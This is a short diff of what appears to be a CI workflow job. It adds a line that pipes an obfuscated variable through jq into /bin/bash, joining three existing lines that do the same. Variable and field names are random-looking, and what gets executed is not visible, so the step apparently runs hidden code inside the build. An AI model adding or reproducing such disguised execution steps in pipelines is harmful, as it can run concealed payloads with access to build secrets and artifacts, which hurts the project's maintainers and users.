@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$g4446" | jq -r .o413 | /bin/bash
           echo $c631 | jq -r .jj06614 | /bin/bash
           echo $vtqv23 | jq -r .apu9344 | /bin/bash
+          echo $voyb876 | jq -r .vb7775 | /bin/bash
 
       - name: Upload artifact
         if: always()
